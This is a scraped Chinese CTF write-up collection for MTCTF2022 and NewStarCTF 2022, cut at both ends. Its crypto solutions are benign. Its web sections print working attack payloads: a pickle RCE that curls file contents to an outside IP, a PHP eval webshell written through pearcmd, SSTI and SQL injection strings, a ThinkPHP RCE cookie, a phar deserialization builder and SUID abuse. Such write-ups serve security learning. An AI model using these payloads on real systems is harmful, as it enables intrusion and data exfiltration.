requests.post(url=url, headers=head, data=payload_4) if \"user1\" in r.text: flag += j print(flag) ","date":"2023-07-12","objectID":"/mtctf2022/:1:1","tags":["ctf"],"title":"MTCTF2022","uri":"/mtctf2022/"},{"categories":["ctf"],"content":"OnlineUnzip 上传zip，解压显示 软链接任意读取 类似快捷方式，网站后台解压会读取该软链接指向的文件，做到读取任意文件 # 读根目录 ln -s / .a zip --symlinks root.zip .a 发现ffffl111l1a44a4ggg，读取发现无权限，算pin值 PIN值 在flask下，可通过pin启动python交互式调试器 import hashlib from itertools import chain probably_public_bits = [ 'ctf' # flask登录的用户名，/etc/passwd 'flask.app', # modname，默认值 'Flask', # getattr(app, “name”, app.class.name)，默认值 '/usr/local/lib/python3.8/site-packages/flask/app.py' # app.py路径，报错得到 ] private_bits = [ '95532807882', # mac地址十进制，/sys/class/net/eth0/address '96cec10d3d9307792745ec3b85c8962019b065577048ffd94233375ed305835825f08ca636839a3cf042ee07df0ef676' # 机器id，/etc/machine-id+/proc/self/cgroup ] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) 进入后读取文件 import os os.popen('cat /ffffl111l1a44a4ggg').read() ","date":"2023-07-12","objectID":"/mtctf2022/:1:2","tags":["ctf"],"title":"MTCTF2022","uri":"/mtctf2022/"},{"categories":["ctf"],"content":"easypickle python的pickle反序列化 import base64 import pickle from flask import Flask, session import os import random app = Flask(__name__) app.config['SECRET_KEY'] = os.urandom(2).hex() @app.route('/') def hello_world(): if not session.get('user'): session['user'] = ''.join(random.choices(\"admin\", k=5)) return 'Hello {}!'.format(session['user']) @app.route('/admin') def admin(): if session.get('user') != \"admin\": return f\"\u003cscript\u003ealert('Access Denied');window.location.href='/'\u003c/script\u003e\" else: try: a = base64.b64decode(session.get('ser_data')).replace(b\"builtin\", b\"BuIltIn\").replace(b\"os\", b\"Os\").replace(b\"bytes\", b\"Bytes\") if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError(\"R i o b is forbidden\") pickle.loads(base64.b64decode(session.get('ser_data'))) return \"ok\" except: return \"error!\" if __name__ == '__main__': app.run(host='0.0.0.0', port=8888) flask伪造session flask将session存在客户端，只经过base64编码和秘钥签名 爆破key 生成四位十六进制字典 crunch 4 4 1234567890\"abcdef\" \u003e\u003e baopo.txt 爆破工具 https://github.com/Paradoxis/Flask-Unsign pip install flask-unsign[wordlist] # 安装 flask-unsign -u --no-literal-eval --wordlist baopo.txt --server [url] # 字典爆破 得到key bee6 伪造session https://github.com/noraj/flask-session-cookie-manager python flask_session_cookie_manager3.py enocde -s \"bee6\" -t \"{'user':'admin'}\" eyJ1c2VyIjoiYWRtaW4ifQ.Yy_huw.1xsjHN3OtwwMCBzwq7ex4gLhilo 进入admin pickle反序列化 从零开始python反序列化攻击：pickle原理解析 \u0026 不用reduce的RCE姿势 - 知乎 (zhihu.com) 蓝帽杯 2022 web/misc writeup - ek1ng’s Blog 反弹Shell，看这一篇就够了 - 腾讯云开发者社区-腾讯云 (tencent.com) 序列化 import base64 opcode = b'''c__builtin__ map p0 0(S'curl http://175.178.47.228:9999/?q=`cat f*`' tp1 0(cos system g1 tp2 0g0 g2 \\x81p3 0c__builtin__ bytes p4 (g3 t\\x81.''' print(base64.b64encode(opcode)) 伪造session python3 flask_session_cookie_manager3.py encode -s \"d0c0\" -t \"{'user':'admin','ser_data':'Y19fYnVpbHRpbl9fCm1hcApwMAowKFMnY3VybCBodHRwOi8vMTc1LjE3OC40Ny4yMjg6OTk5OS8/cT1gY2F0IGYqYCcKdHAxCjAoY29zCnN5c3RlbQpnMQp0cDIKMGcwCmcyCoFwMwowY19fYnVpbHRpbl9fCmJ5dGVzCnA0CihnMwp0gS4='}\" 发送，得到flag ","date":"2023-07-12","objectID":"/mtctf2022/:1:3","tags":["ctf"],"title":"MTCTF2022","uri":"/mtctf2022/"},{"categories":["ctf"],"content":"Crypto ","date":"2023-07-12","objectID":"/mtctf2022/:2:0","tags":["ctf"],"title":"MTCTF2022","uri":"/mtctf2022/"},{"categories":["ctf"],"content":"strange_rsa1 from Crypto.Util.number import * from sage.all import RealField from secret import flag1 Bits = 512 p = getPrime(Bits) q = getPrime(Bits) n = p * q gift = RealField(prec=Bits*2)(p) / RealField(prec=Bits*2)(q) e = 0x10001 m = bytes_to_long(flag1) c = pow(m, e, n) output = open('output.txt', 'w') output.write('n = ' + str(n) + '\\n') output.write('c = ' + str(c) + '\\n') output.write('gift = ' + str(gift) + '\\n') output.txt n = 108525167048069618588175976867846563247592681279699764935868571805537995466244621039138584734968186962015154069834228913223982840558626369903697856981515674800664445719963249384904839446749699482532818680540192673814671582032905573381188420997231842144989027400106624744146739238687818312012920530048166672413 c = 23970397560482326418544500895982564794681055333385186829686707802322923345863102521635786012870368948010933275558746273559080917607938457905967618777124428711098087525967347923209347190956512520350806766416108324895660243364661936801627882577951784569589707943966009295758316967368650512558923594173887431924 gift = 0.9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938 因为gift = p/q，n = pq，所以giftn = p^2 考虑精度，先将gift去掉小数点，乘积后再舍位 from Crypto.Util.number import * import gmpy2 n = 108525167048069618588175976867846563247592681279699764935868571805537995466244621039138584734968186962015154069834228913223982840558626369903697856981515674800664445719963249384904839446749699482532818680540192673814671582032905573381188420997231842144989027400106624744146739238687818312012920530048166672413 c = 23970397560482326418544500895982564794681055333385186829686707802322923345863102521635786012870368948010933275558746273559080917607938457905967618777124428711098087525967347923209347190956512520350806766416108324895660243364661936801627882577951784569589707943966009295758316967368650512558923594173887431924 gift = 0.9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938 g = 9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938 e = 0x10001 p = gmpy2.iroot(int(str(n*g)[:-307]),2)[0] q = n//p fn = (p-1)*(q-1) d = gmpy2.invert(e,fn) m = pow(c,d,n) s = long_to_bytes(m).decode() print(s) ","date":"2023-07-12","objectID":"/mtctf2022/:2:1","tags":["ctf"],"title":"MTCTF2022","uri":"/mtctf2022/"},{"categories":["ctf"],"content":"week1 ","date":"2023-07-12","objectID":"/newstar2022/:1:0","tags":["ctf"],"title":"newstar2022","uri":"/newstar2022/"},{"categories":["ctf"],"content":"misc mmsstv ","date":"2023-07-12","objectID":"/newstar2022/:1:1","tags":["ctf"],"title":"newstar2022","uri":"/newstar2022/"},{"categories":["ctf"],"content":"crypto rsa 维纳攻击 ","date":"2023-07-12","objectID":"/newstar2022/:1:2","tags":["ctf"],"title":"newstar2022","uri":"/newstar2022/"},{"categories":["ctf"],"content":"week2 ","date":"2023-07-12","objectID":"/newstar2022/:2:0","tags":["ctf"],"title":"newstar2022","uri":"/newstar2022/"},{"categories":["ctf"],"content":"misc 奇怪的波形 侧信道 看两个波形差距 奇怪的二维码 二维码（Aztec Code 在线生成条形码 (aspose.app) ","date":"2023-07-12","objectID":"/newstar2022/:2:1","tags":["ctf"],"title":"newstar2022","uri":"/newstar2022/"},{"categories":["ctf"],"content":"crypto ezRabin rabin加密时e为2，本题目e为4，一次解密得到的是m^2 mod n，再解密一次就能得到m RSA攻击之Rabin密码体制_Gm1y的博客-CSDN博客_rabin密码 ezPRNG task.py： from Crypto.Util.number import * flag = b'xxxxxxxxxxxxxxxxxxxx' class my_prng_lcg: def __init__(self, seed, multiplier, increment, modulus): self.state = seed self.multiplier = multiplier self.increment = increment self.modulus = modulus def random(self): self.state = (self.state * self.multiplier + self.increment) % self.modulus return self.state PRNG = my_prng_lcg(bytes_to_long(flag), getRandomInteger(256), getRandomInteger(256), getRandomInteger(256)) gift = [] for i in range(6): gift.append(PRNG.random()) qwq = bytes_to_long(flag) print(qwq.bit_length()) print(gift) # [32579077549265101609729134002322479188058664203229584246639330306875565342934, # 30627296760863751873213598737521260410801961411772904859782399797798775242121, # 59045755507520598673072877669036271379314362490837080079400207813316110037822, # 29714794521560972198312794885289362350476307292503308718904661896314434077717, # 3378007627369454232183998646610752441039379051735310926898417029172995488622, # 35893579613746468714922176435597562302206699188445795487657524606666534642489] https://www.codercto.com/a/35743.html Crypto学习笔记 – 天璇Merak (buptmerak.cn) PRNG伪随机数的破解方法_OnlyForBetter的博客-CSDN博客_prng exp.py： from Crypto.Util.number import * from functools import reduce import gmpy2 # states至少3 def crack_unkown_N0(states,moudulus): a=((states[2]-states[1])*gmpy2.invert(states[1]-states[0],moudulus))%moudulus b=(states[1]-(a*states[0]))%moudulus return (((states[0]-b))*gmpy2.invert(a,n)+n)%moudulus def crack_unknown_increment(states, modulus, multiplier): increment = (states[1] - states[0]*multiplier) % modulus return modulus, multiplier, increment def crack_unknown_multiplier(states, modulus): multiplier = (states[2] - states[1]) * inverse(states[1] - states[0], modulus) % modulus return crack_unknown_increment(states, modulus, multiplier) # states至少6 def crack_unknown_modulus(states): diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(GCD, zeroes)) return crack_unknown_multiplier(states, modulus) data = [32579077549265101609729134002322479188058664203229584246639330306875565342934,30627296760863751873213598737521260410801961411772904859782399797798775242121,59045755507520598673072877669036271379314362490837080079400207813316110037822,29714794521560972198312794885289362350476307292503308718904661896314434077717,3378007627369454232183998646610752441039379051735310926898417029172995488622,35893579613746468714922176435597562302206699188445795487657524606666534642489] n,a,b = crack_unknown_modulus(data) flag = crack_unkown_N0(data,n) print(long_to_bytes(flag).decode()) ","date":"2023-07-12","objectID":"/newstar2022/:2:2","tags":["ctf"],"title":"newstar2022","uri":"/newstar2022/"},{"categories":["ctf"],"content":"web IncludeOne php伪随机数 php_mt_seed - PHP mt_rand() seed cracker (openwall.com) php伪协议（rot13 payload ?file=php://filter/read=string.rot13/NewStar/resource=./flag.php guess=1202031004 题目要求有NewStar/，在伪协议这个地方添加不会影响读取 UnserializeOne \u003c?php error_reporting(0); highlight_file(__FILE__); #Something useful for you : https://zhuanlan.zhihu.com/p/377676274 class Start{ public $name; protected $func; public function __destruct() { echo \"Welcome to NewStarCTF, \".$this-\u003ename; } public function __isset($var) { ($this-\u003efunc)(); } } class Sec{ private $obj; private $var; public function __toString() { $this-\u003eobj-\u003echeck($this-\u003evar); return \"CTFers\"; } public function __invoke() { echo file_get_contents('/flag'); } } class Easy{ public $cla; public function __call($fun, $var) { $this-\u003ecla = clone $var[0]; } } class eeee{ public $obj; public function __clone() { if(isset($this-\u003eobj-\u003ecmd)){ echo \"success\"; } } } if(isset($_POST['pop'])){ unserialize($_POST['pop']); } PHP反序列化研究 - 知乎 (zhihu.com) （序列化保存对象成员值，自定义函数不会保存 exp.php \u003c?php class Start{ public $name; protected $func; public function __construct($name,$func) { $this-\u003ename = $name; $this-\u003efunc = $func; } } class Sec{ private $obj; private $var; public function __construct($obj, $var) { $this-\u003eobj = $obj; $this-\u003evar = $var; } } class Easy{ public $cla; public function __construct($cla) { $this-\u003ecla = $cla; } } class eeee{ public $obj; public function __construct($obj) { $this-\u003eobj = $obj; } } $Sec1 = new Sec(null,null); $Start1 = new Start(\"mof\",$Sec1); $eeee = new eeee($Start1); $Easy = new Easy(null); $Sec2 = new Sec($Easy,$eeee); $Start2 = new Start($Sec2,$Sec2); echo urlencode(serialize($Start2)); ?\u003e ezAPI 御剑扫到www.zip源码 index.php \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" /\u003e \u003ctitle\u003eSearch Page\u003c/title\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"css/style.css\" tppabs=\"css/style.css\" /\u003e \u003cstyle\u003e body { height: 100%; background: #16a085; overflow: hidden; } canvas { z-index: -1; position: absolute; } \u003c/style\u003e \u003cscript src=\"js/jquery.js\"\u003e\u003c/script\u003e \u003cscript src=\"js/verificationNumbers.js\" tppabs=\"js/verificationNumbers.js\"\u003e\u003c/script\u003e \u003cscript src=\"js/Particleground.js\" tppabs=\"js/Particleground.js\"\u003e\u003c/script\u003e \u003cscript\u003e $(document).ready(function() { $('body').particleground({ dotColor: '#5cbdaa', lineColor: '#5cbdaa' }); });ß \u003c/script\u003e \u003c/head\u003e \u003c!--unremove DEBUG function, please delete it--\u003e \u003cbody\u003e \u003cdl class=\"admin_login\"\u003e \u003cdt\u003e \u003cfont color=\"white\"\u003e\u003cstrong\u003eSearch Page Beta\u003c/strong\u003e\u003c/font\u003e \u003c/dt\u003e \u003cform action=\"index.php\" method=\"post\"\u003e \u003cdd class=\"user_icon\"\u003e \u003cinput type=\"text\" name=\"id\" placeholder=\"用户ID\" class=\"login_txtbx\" /\u003e \u003c/dd\u003e \u003cdd\u003e \u003cinput type=\"submit\" value=\"Search\" class=\"submit_btn\" /\u003e \u003c/dd\u003e \u003c/form\u003e\u003cbr\u003e \u003ccenter\u003e \u003cfont size=\"4px\" color=\"white\"\u003e \u003c?php error_reporting(0); $id = $_POST['id']; function waf($str) { if (!is_numeric($str) || preg_replace(\"/[0-9]/\", \"\", $str) !== \"\") { return False; } else { return True; } } function send($data) { $options = array( 'http' =\u003e array( 'method' =\u003e 'POST', 'header' =\u003e 'Content-type: application/json', 'content' =\u003e $data, 'timeout' =\u003e 10 * 60 ) ); $context = stream_context_create($options); $result = file_get_contents(\"http://graphql:8080/v1/graphql\", false, $context); return $result; } if (isset($id)) { if (waf($id)) { isset($_POST['data']) ? $data = $_POST['data'] : $data = '{\"query\":\"query{\\nusers_user_by_pk(id:' . $id . ') {\\nname\\n}\\n}\\n\", \"variables\":null}'; $res = json_decode(send($data)); if ($res-\u003edata-\u003eusers_user_by_pk-\u003ename !== NULL) { echo \"ID: \" . $id . \"\u003cbr\u003eName: \" . $res-\u003edata-\u003eusers_user_by_pk-\u003ename; } else { echo \"\u003cb\u003eCan't found it!\u003c/b\u003e\u003cbr\u003e\u003cbr\u003eDEBUG: \"; var_dump($res-\u003edata); } } else { die(\"\u003cb\u003eHacker! Only Number!\u003c/b\u003e\"); } } else { die(\"\u003cb\u003eNo Data?\u003c/b\u003e\"); } ?\u003e \u003c/font\u003e \u003c/center\u003e \u003c/dl\u003e \u003c/body\u003e \u003c/html\u003e 发现使用$data进行graphQL查询 isset($_POST['data']) ? $data = $_POST['data'] : $data = '{\"query\":\"query{\\nusers_user_by_pk(id:' . $id . ') {\\nname\\n}\\n}\\n\", \"variables\":null}'; 参考：当CTF遇上GraphQL的那些事 (hwlanxiaojun.github.io) 大体解析过程，是遇到一个Query就取值，对返回值解","date":"2023-07-12","objectID":"/newstar2022/:2:3","tags":["ctf"],"title":"newstar2022","uri":"/newstar2022/"},{"categories":["ctf"],"content":"week3 ","date":"2023-07-12","objectID":"/newstar2022/:3:0","tags":["ctf"],"title":"newstar2022","uri":"/newstar2022/"},{"categories":["ctf"],"content":"web BabySSTI_One flask ssti注入 Python安全 | Flask-jinja2 SSTI 利用手册 - Python社区 (python88.com) 思路：找到os，执行命令读取 绕过：|attr() 加 字符串拼接 payload： ?name=%7B%7B()|attr(\"__cla\"+\"ss__\")|attr(\"__bas\"+\"es__\")|attr(\"__getitem__\")(0)|attr(\"__subcl\"+\"asses__\")()|attr(\"__getitem__\")(117)|attr(\"__in\"+\"it__\")|attr(\"__globals__\")|attr(\"__getitem__\")(\"popen\")(\"ca\"+\"t%20/fl\"+\"ag_in_here\")|attr(\"read\")()%7D%7D multiSQL 堆叠注入+update BUUCTF-Web-随便注(三种解题思路) - 简书 (jianshu.com) 绕过：预处理语句 + concat字符串拼接 payload： ?username=1' or ''='';SET @sql=concat('up','date score SET listen=200');PREPARE jwt from @sql;EXECUTE jwt;# IncludeTwo percmd.php + rce Sourceless Guessy Web (pearcmd+rce) payload: ?file=pearcmd\u0026+config-create+/\u003c?=@eval($_POST['cmd']);?\u003e+./cmd.php 中国蚁剑连接 url?file=./cmd cmd Maybe You Have To think More https://www.freebuf.com/vuls/263977.html thinkphp5.1.41 rce漏洞 + cookie https://www.anquanke.com/post/id/241148 linux proc获取环境变量信息发现flag payload： Cookie: tp_user=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0= ?name=cat%20/proc/self/environ ","date":"2023-07-12","objectID":"/newstar2022/:3:1","tags":["ctf"],"title":"newstar2022","uri":"/newstar2022/"},{"categories":["ctf"],"content":"crpto keyExchange keyExchange.py from secret import flag, gb, g, p, Diffie_Hellman_KEY_EXCHANGE from Crypto.Util.number import * from base64 import b64encode from Crypto.Cipher import AES from hashlib import md5 from Crypto.Util.Padding import pad plaintext = pad(flag, 16) a = getRandomNBitInteger(1024) shared = Diffie_Hellman_KEY_EXCHANGE(a) # the original one, not the elliptic curve version!!!! key = md5(str(shared).encode()).digest() cipher = AES.new(key, AES.MODE_ECB) ciphertext = cipher.encrypt(plaintext) print(f'师傅给你送了一个flag') print(f'加密的flag = {b64encode(ciphertext)}') print(f'p = {p}') print(f'your secret key {a}') print(f'g = {g}') print(f'师傅的公钥 = {gb}') output.txt 师傅给你送了一个flag 加密的flag = b'w8OCrexPPqnv2hR+xKeHhXIp0Blp1DYCV4LeZeeLpv5MzUL71raTOeOs4SQBySHH' p = 133448764119399847876731592238604881175769007976799828874328988761588128500145459082023001027383524831194316266946485380737147372837136403065060245135035225976604193830121124575947440188318348815263642243784574567832213775382081426762862856428888257126982268557543952549848053225651398101391048467656128070913 your secret key 141940531741414073502483547551457269459744373002985569536254444581939073930343975447649087549033350166772929396986965301002444997704537487577508504709368627174241095027876996113941220579274986994026832534664179333669861059196192190040046004398523932288881838011696679341328520530265002776147308306715042734185 g = 3 师傅的公钥 = 89434791765835058026108803508194156525355359465406829253856379139334424137549915669535243140614128105195584073112084994777148895681804127886440617684648237403345873311011154293855911891719204975035914932661810961867593769891076834656437254428353814290948181922438812745384577094827728409350756648446941874382 DH秘钥交换方法 Alice，Bob事先约定参数：素数p，⽣成元g Alice私钥skA，公钥pkA=gskA；Bob私钥skB，公钥pkB=gskB 进⾏密钥交换时，计算share=pkAskB=pkBskA=g^(skA*skB) 题⽬中给出了⼀⽅的公钥与另⼀⽅的私钥，直接计算可以得到交换密钥 import base64 from hashlib import md5 from Crypto.Cipher import AES a = 141940531741414073502483547551457269459744373002985569536254444581939073930343975447649087549033350166772929396986965301002444997704537487577508504709368627174241095027876996113941220579274986994026832534664179333669861059196192190040046004398523932288881838011696679341328520530265002776147308306715042734185 p = 133448764119399847876731592238604881175769007976799828874328988761588128500145459082023001027383524831194316266946485380737147372837136403065060245135035225976604193830121124575947440188318348815263642243784574567832213775382081426762862856428888257126982268557543952549848053225651398101391048467656128070913 g = 3 gb = 89434791765835058026108803508194156525355359465406829253856379139334424137549915669535243140614128105195584073112084994777148895681804127886440617684648237403345873311011154293855911891719204975035914932661810961867593769891076834656437254428353814290948181922438812745384577094827728409350756648446941874382 flag = b'w8OCrexPPqnv2hR+xKeHhXIp0Blp1DYCV4LeZeeLpv5MzUL71raTOeOs4SQBySHH' flag = base64.b64decode(flag) K = pow(gb,a,p) key = md5(str(K).encode()).digest() cipher = AES.new(key,AES.MODE_ECB) flag = cipher.decrypt(flag) print(flag.decode()) Prof. Shamir’s Secret lab.py： from Crypto.Util.number import * from secret import flag a = getPrime(256) b = getPrime(256) c = getPrime(256) d = bytes_to_long(flag) n = getStrongPrime(2048) def poly(x): return (a * x ** 3 + b * x ** 2 + c * x + d) % n for _ in range(4): x = getRandomNBitInteger(256) print(f'({x}, {poly(x)})') print(n) output.txt： (107156592202708719207677242145785380370925248573491581679548864240229105117413, 130345771647598884054430192964980389494531690916321281560051538057910945565624075918097771618618910263287152864051564635195578796179646674192491555857366963976329072793625649841007238934532144994966695961491116944111900519450656607199501654544809304677384301432194356761274376314501143216649135187625964931902) (90629424458637844580841178302065768114471702341586161908858665404968070428143, 78858394764644720845979385422903377","date":"2023-07-12","objectID":"/newstar2022/:3:2","tags":["ctf"],"title":"newstar2022","uri":"/newstar2022/"},{"categories":["ctf"],"content":"week4 ","date":"2023-07-12","objectID":"/newstar2022/:4:0","tags":["ctf"],"title":"newstar2022","uri":"/newstar2022/"},{"categories":["ctf"],"content":"web BabySSTI_Two SSTI进阶 | 沉铝汤的破站 (chenlvtang.top) []绕过“和关键字；hex编码或Unicode绕过 payload： ?name={{''['__cla''ss__']['__ba''ses__'][0]['__subcl''asses__']()[117]['__in''it__']['__glo''bals__']['po''pen']('\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\\x5f\\x69\\x6e\\x5f\\x68\\x33\\x72\\x33\\x5f\\x35\\x32\\x64\\x61\\x61\\x64')['re''ad']()}} 又一个SQL 绕过空格：%0c 前面数字不能直接引号闭合，直接写个没有数据的数字（没遇到 payload： name=122%0cunion%0cselect%0ctext,id%0cfrom%0cwfy_comments%0cwhere%0cid=100 （数据库没换过，可以直接看前几周的 So Baby RCE 绕过关键词：${11} 绕过空格：%09 绕过分号：%0a 绕过文件名fl：shell特殊变量 $@ payload： cmd=cd%09..%0acd%09..%0acd%09..%0aca${11}t%09ffff$@llllaaaaggggg UnserializeThree 检测，发现class.php \u003c?php highlight_file(__FILE__); class Evil{ public $cmd; public function __destruct() { if(!preg_match(\"/\u003e|\u003c|\\?|php|\".urldecode(\"%0a\").\"/i\",$this-\u003ecmd)){ //Same point ,can you bypass me again? eval(\"#\".$this-\u003ecmd); }else{ echo \"No!\"; } } } file_exists($_GET['file']); 文件上传+反序列化 一般为phar 参考：反序列化之Phar流 - 腾讯云开发者社区-腾讯云 (tencent.com) 上传phar文件，利用伪协议读取，触发反序列化 生成phar \u003c?php class Evil{ public $cmd = \"\\rls /\"; # /r绕过# } $a = new Evil(); $phar = new Phar(\"E:/test.phar\"); //生成的phar文件，调用后缀名必须为phar $phar-\u003estartBuffering(); $phar-\u003esetStub('GIF89a'.\"\u003c?php __HALT_COMPILER(); ?\u003e\"); //设置stub $phar-\u003esetMetadata($a); //将自定义的meta-data存入manifest $phar-\u003eaddFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-\u003estopBuffering(); ?\u003e 上传phar文件，更改文件类型绕过，得到文件路径 class.php?file=phar://文件路径 之后更改$cmd重新上传就能得到flag phar报错：将php.ini中的 ;phar.readonly = On 改为 phar.readonly = Off ！！！Rome java反序列化 ROME链 工具：ysoserial ysoserial使用方法 – cc (ccship.cn) 反编译Release JD-GUI 1.6.6 · java-decompiler/jd-gui (github.com) ","date":"2023-07-12","objectID":"/newstar2022/:4:1","tags":["ctf"],"title":"newstar2022","uri":"/newstar2022/"},{"categories":["ctf"],"content":"crypto LCG Revenge 线性同余式 Crypto-LCG（线性同余方程） | 此间的少年 (gitee.io) x(n+1) = (ax(n)+c) (mod m) ta=1 (mod m), x(n) = t*(x(n+1)-c) (mod m) from Crypto.Util.number import * from secret import FLAG p = getPrime(128) step = len(FLAG) // 3 xs = [bytes_to_long(FLAG[:step]), bytes_to_long(FLAG[step:2*step]), bytes_to_long(FLAG[2*step:])] a = getPrime(64) b = getPrime(64) c = getPrime(64) a = 18038175596386287827 b = 15503291946093443851 c = 17270168560153510007 p = 307956849617421078439840909609638388517 for _ in range(10): new_state = (a*xs[0] + b*xs[1] + c*xs[2]) % p xs = xs[1:] + [new_state] #print(xs) print(xs) print(a, b, c, p) exp： import Crypto from Crypto.Util.number import * import gmpy2 xs = [255290883651191064919890629542861653873, 221128501895959214555166046983862519384, 108104020183858879999084358722168548984] a = 18038175596386287827 b = 15503291946093443851 c = 17270168560153510007 p = 307956849617421078439840909609638388517 t = gmpy2.invert(a,p) for _ in range(10): new = (t*(xs[2]-b*xs[0]-c*xs[1]))%p xs = [new] + xs flag = long_to_bytes(xs[0]).decode() + long_to_bytes(xs[1]).decode() + long_to_bytes(xs[2]).decode() print(flag) 代数关系 from Crypto.Util.number import * from secret import flag p = getStrongPrime(2048) q = getStrongPrime(2048) n = p*q phi = (p-1)*(q-1) e1 = getPrime(16) e2 = getPrime(16) e3 = getPrime(16) d1 = inverse(e1, phi) d2 = inverse(e2, phi) d3 = inverse(e3, phi) gift_from_fallwind = d2 - d1 sp = len(flag) // 3 m1 = bytes_to_long(flag[0:sp]) m2 = bytes_to_long(flag[sp: 2*sp]) m3 = bytes_to_long(flag[2*sp:]) c1= pow(m1, e1, n) c2= pow(m2, e2, n) c3= pow(m3, e3, n) print(f'n = {n}') print(f'e1 = {e1}') print(f'e2 = {e2}') print(f'e3 = {e3}') print(f'c1 = {c1}') print(f'c2 = {c2}') print(f'c3 = {c3}') print(f'gift_from_fallwind = {gift_from_fallwind}') n = 714592173868259951547903824656567142382519201815807137392662736000480461106944240411907971077744283561181468187349950157770542641452016168710768060100431878635594871092115167496636869765435245733216244455291669985854820686150487479060100362374214950338593785006799039892489525125499595277195821419495485780569578409849268011672935670978669183434574625404664252352238179018153026065565737180327403650490113961989352069795255693066847568569258596045200617988242378417608661573561288798387013713959291514998718810340095720086582431808535500784877130015856483311803720730193251968718389940211890886176473856457082812043712013634688479195044004890584238387779313840532514565194377261080408568578839974414957533288241409106206637332990105576057838430267703746376981194305776942499262213827373958311438790046259142383469934115411137484269094594634801601455381187640866738280586324069047262621776502056490534194678730988305691412586133810702956723819024793893235153104715079346666767828770304227597496868066084967074574249861996861449220457370695654952738759446674531850565616794250604969906523629086439326216263355721761747979532714573810102811235244618245569028203230483116293028005467298691574981713677092048315265963514382056811642161463 e1 = 42407 e2 = 42299 e3 = 64279 c1 = 147746559360802924168767659277705450630485609696398746571701418818848770182885487620535212747337538428905143459150636194921920646777706320249140903061217676389530668645622949973659702291367297066656754690100263868506461956113055815101461657779702873682097533482492493899104205046186278766341878854368500917007433940486307279045874511368494257897755625125620904196433190777249505786257092826031743302124873284619940344765699423310728402472381757497703327215054987663079091464775324695334786123993004899881875932719629531115443494782427464033199136840262965875592542948702903121840007890458510167896574258848373182376940828605330277069434815885568024582498080844909563591272397488770838751339866638704837915487427276557777372613819511517108295620835412232055690690331814390700825513053666493393942792555525632325524757429986865995789852014588602452362551730826736918369894537815766447265166762601145909581089407049818337486974","date":"2023-07-12","objectID":"/newstar2022/:4:2","tags":["ctf"],"title":"newstar2022","uri":"/newstar2022/"},{"categories":["ctf"],"content":"week5 ","date":"2023-07-12","objectID":"/newstar2022/:5:0","tags":["ctf"],"title":"newstar2022","uri":"/newstar2022/"},{"categories":["ctf"],"content":"web BabySSTI_Three 方括号加hex编码绕过 （hex编码不知道怎么用脚本写，都是手动，后面想想 payload： ?name={{''['\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f']['\\x5f\\x5f\\x62\\x61\\x73\\x65\\x73\\x5f\\x5f'][0]['\\x5f\\x5f\\x73\\x75\\x62\\x63\\x6c\\x61\\x73\\x73\\x65\\x73\\x5f\\x5f']()[117]['\\x5f\\x5f\\x69\\x6e\\x69\\x74\\x5f\\x5f']['\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f']['\\x70\\x6f\\x70\\x65\\x6e']('\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\\x5f\\x69\\x6e\\x5f\\x68\\x33\\x72\\x33\\x5f\\x35\\x32\\x64\\x61\\x61\\x64')['re''ad']()}}}} So Baby RCE Again shell_exec 无回显 ls || sleep 3，判断命令是否执行成功 可以访问网站目录下文件，将命令执行结果输出到index.txt 在根目录找到/ffll444aaggg，但无权访问 发现/bin/date执行权限为s，可以suid提权，将报错输出到index.txt ?cmd=/bin/date -f /ffll444aaggg 2\u003e index.txt||sleep 3 Give me your photo PLZ 文件上传 传.htaccess解析，再传后门 蚁剑连接，打开根目录flag 恭喜你做到这里，这周的比赛结束后，NewStarCTF也就告一段落了，不过，我们不希望这事你CTF旅途的终点，现在去env里面拿你真正的flag吧 env命令显示环境变量，得到flag Unsafe Apache CVE-2021-41773 Apache HTTP Server 路径穿越漏洞复现 - FreeBuf网络安全行业门户 CVE-2021-41773，开启了cgi，可构造恶意请求执行命令 poc： POST 